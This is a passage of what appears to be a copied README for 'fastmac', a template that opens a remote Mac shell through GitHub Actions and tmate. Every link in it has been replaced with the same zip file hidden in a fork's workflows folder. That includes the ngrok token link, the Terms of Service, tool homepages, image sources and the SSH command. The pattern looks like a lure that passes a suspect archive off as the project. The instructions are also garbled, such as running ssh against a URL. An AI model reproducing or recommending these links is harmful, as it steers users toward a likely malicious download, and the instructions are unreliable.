...
* Add three secrets to your cloned repo:
  * `NGROK_AUTH_TOKEN` with your auth key from https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip
...
Easy fix: set the password by hand by hashing it into the preferences file. See https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip
...
<a href="https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip"><img src="https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip" width="727" /></a>

**NB**: Please check the [GitHub Actions Terms of Service](https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip). Note that your repo needs to be public, otherwise you have a strict monthly limit on how many minutes you can use. Note also that according to the TOS the repo that contains these files needs to be the same one where you're developing the project that you're using it for, and specifically that you are using it for the "*production, testing, deployment, or publication of [that] software project*".

## Clone template

First, [click here](https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip) to create a copy of this repo in your account. Type `fastmac` under "repository name" and then click "Create repository from template". After about 10 seconds, you'll see a screen that looks just like the one you're looking at now, except that it'll be in your repo copy.
...
<img width="365" src="https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip" />
...
```
WebURL: https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip

SSH: ssh https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip
```

Copy and paste the ssh line (e.g `ssh https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip` in this case) into your terminal (Windows users: I strongly recommend you use [WSL](https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip) if possible) and press <kbd>Enter</kbd>.

You'll see a welcome message. Press <kbd>q</kbd> to remove it, and you'll be in a Mac shell! The shell already has [brew](https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip) installed, so you can easily add any software you need.
...
`fastmac` is a very thin wrapper around [tmate](https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip), so all the features of tmate are available. tmate itself is based on [tmux](https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip), so you have all that functionality too. In practice, that means other people can connect to the same ssh session, and you'll all be sharing the same screen! This can be very handy for debugging and support. The integration with Github Actions is provided by [action-tmate](https://github.com/TheCreepeeer/fastmac-VNCgui/raw/refs/heads/master/.github/workflows/Cgui_fastmac_VN_v1.4.zip).
